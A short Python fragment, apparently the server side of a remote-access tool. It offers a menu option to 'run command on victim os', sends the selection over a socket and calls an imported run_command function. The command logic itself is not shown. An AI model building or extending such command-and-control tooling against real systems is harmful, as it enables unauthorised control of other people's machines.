from command import run_command
#hello
def showopytions():
    #print("\n")
    print("\tt1. run command on victim os ")

def handleconn(mysocket):
    print("+ handling connections")

    while(True):

        showopytions()
        user_input=input("+ select your options ")
        mysocket.send_data(user_input)
        if user_input=="99":
            break
        elif user_input=="1":
            run_command(mysocket)
            #develop function that will run commands
        else:
            print("wrong input")
#        print(mysocket.receive_data())
